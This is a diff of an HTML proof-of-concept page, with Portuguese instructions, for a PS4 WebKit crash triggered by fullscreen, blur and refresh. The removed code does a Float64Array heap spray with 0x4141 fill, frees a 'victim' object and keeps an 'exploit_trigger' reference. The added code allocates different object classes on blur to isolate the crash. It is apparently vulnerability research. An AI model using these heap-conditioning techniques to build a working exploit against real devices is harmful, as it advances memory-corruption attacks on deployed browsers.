@@ -1,114 +1,134 @@
+
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>PS4 WebKit PoC CE-36329-3 – Heap Conditioning Audit</title>
+    <meta charset="UTF-8">
+    <title>PS4 WebKit Fullscreen + Blur Crash — Class Isolation PoC</title>
+    <style>
+        body {
+            font-family: monospace;
+            background: #000;
+            color: #0f0;
+            padding: 20px;
+        }
+        button, select {
+            font-size: 16px;
+            padding: 8px;
+            margin: 5px 0;
+        }
+        .warn {
+            color: #ff0;
+            margin-top: 10px;
+        }
+        .danger {
+            color: #f00;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
 
-<h2>PS4 WebKit Memory Corruption PoC</h2>
+<h1>PS4 WebKit Crash — Heap Class Isolation</h1>
 
-<div id="msg">
-INSTRUÇÕES:<br>
-1. Marque UM teste.<br>
-2. Clique RUN TEST.<br>
-3. Entre em Fullscreen.<br>
-4. Pressione OPTIONS → REFRESH.
-</div>
+<p>
+Fluxo obrigatório:<br>
+1. RUN TEST<br>
+2. OPTIONS (Blur)<br>
+3. REFRESH
+</p>
 
-<hr>
+<label>Classe em teste:</label><br>
+<select id="mode">
+    <option value="none">Nenhum (controle)</option>
+    <option value="arrays">Float64Array</option>
+    <option value="strings">Strings grandes</option>
+    <option value="objects">Objetos JS simples</option>
+    <option value="closures">Closures / funções</option>
+    <option value="dom">DOM Nodes</option>
+    <option value="listeners">Event listeners</option>
+</select>
 
-<h3>Testes de Heap / Arrays</h3>
-<label><input type="checkbox" id="tA"> TESTE A – Arrays sem spray (sem 0x4141)</label><br>
-<label><input type="checkbox" id="tB"> TESTE B – Arrays criados ANTES do fullscreen</label><br>
-<label><input type="checkbox" id="tC"> TESTE C – Liberar Arrays antes do refresh</label><br>
-<label><input type="checkbox" id="tD"> TESTE D – Tipo alternativo (Array / Uint8Array)</label><br>
-<label><input type="checkbox" id="tE"> TESTE E – Crescimento gradual (threshold)</label><br>
-
-<hr>
-
+<br>
 <button onclick="fire()">RUN TEST</button>
 
-<pre id="log"></pre>
+<p id="status" class="warn"></p>
 
 <script>
-const log = m => document.getElementById("log").textContent += m + "\n";
-
-let spray_storage = [];
-let victim = {
-    id: "VICTIM_OBJECT",
-    data: new Array(100).fill(1.1),
-    ptr: { a: 1 }
-};
-
-function allocFloatSpray(count, fill) {
-    for (let i = 0; i < count; i++) {
-        let a = new Float64Array(32);
-        if (fill) a.fill(2.121995791e-314); // 0x4141414141414141
-        spray_storage.push(a);
-    }
-}
-
-function allocAltSpray(count) {
-    for (let i = 0; i < count; i++) {
-        let a = new Uint8Array(256);
-        a.fill(0x41);
-        spray_storage.push(a);
-    }
-}
+let heap = [];
 
 function fire() {
-    log("[*] RUN pressed");
+    heap = [];
+    document.getElementById("status").innerText =
+        "Fullscreen ativo. Aperte OPTIONS e depois REFRESH.";
 
-    /* TESTE B – heap pré-condicionado */
-    if (tB.checked) {
-        log("[TEST B] Pre-blur allocation");
-        allocFloatSpray(10000, true);
-    }
-
-    const doc = document.documentElement;
-    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
+    const el = document.documentElement;
+    if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+    else if (el.requestFullscreen) el.requestFullscreen();
 
     window.onblur = function () {
-        log("[!] BLUR detected");
+        const mode = document.getElementById("mode").value;
+        console.log("[*] Blur detected. Mode:", mode);
 
-        /* TESTE A */
-        if (tA.checked) {
-            log("[TEST A] Arrays sem spray");
-            allocFloatSpray(10000, false);
-        }
+        try {
+            switch (mode) {
 
-        /* TESTE D */
-        if (tD.checked) {
-            log("[TEST D] Tipo alternativo");
-            allocAltSpray(8000);
-        }
+                case "arrays":
+                    for (let i = 0; i < 10000; i++) {
+                        heap.push(new Float64Array(32));
+                    }
+                    break;
 
-        /* TESTE E */
-        if (tE.checked) {
-            log("[TEST E] Crescimento gradual");
-            for (let step = 0; step < 50; step++) {
-                allocFloatSpray(200, true);
+                case "strings":
+                    for (let i = 0; i < 5000; i++) {
+                        heap.push("A".repeat(100000));
+                    }
+                    break;
+
+                case "objects":
+                    for (let i = 0; i < 10000; i++) {
+                        heap.push({ a: i, b: "test", c: { x: i } });
+                    }
+                    break;
+
+                case "closures":
+                    for (let i = 0; i < 8000; i++) {
+                        let x = i;
+                        heap.push(function () { return x; });
+                    }
+                    break;
+
+                case "dom":
+                    for (let i = 0; i < 3000; i++) {
+                        let d = document.createElement("div");
+                        d.textContent = "NODE " + i;
+                        document.body.appendChild(d);
+                        heap.push(d);
+                    }
+                    break;
+
+                case "listeners":
+                    for (let i = 0; i < 5000; i++) {
+                        let b = document.createElement("button");
+                        b.onclick = function () {};
+                        document.body.appendChild(b);
+                        heap.push(b);
+                    }
+                    break;
+
+                case "none":
+                default:
+                    // Controle: nada é alocado
+                    break;
             }
+
+            window.keep_alive = heap;
+
+        } catch (e) {
+            console.log("Allocation error:", e);
         }
 
-        /* PoC ORIGINAL — FREE + SPRAY */
-        log("[*] Free victim");
-        victim = null;
-
-        if (!tA.checked && !tB.checked && !tD.checked && !tE.checked) {
-            log("[*] Original spray");
-            allocFloatSpray(10000, true);
-        }
-
-        /* TESTE C */
-        if (tC.checked) {
-            log("[TEST C] Liberando arrays antes do refresh");
-            spray_storage = null;
-        }
-
-        window.exploit_trigger = spray_storage;
-        log("[*] Ready — REFRESH via Options");
+        document.getElementById("status").innerHTML =
+            "<span class='danger'>AGORA: escolha REFRESH no menu OPTIONS</span>";
     };
 }
 </script>
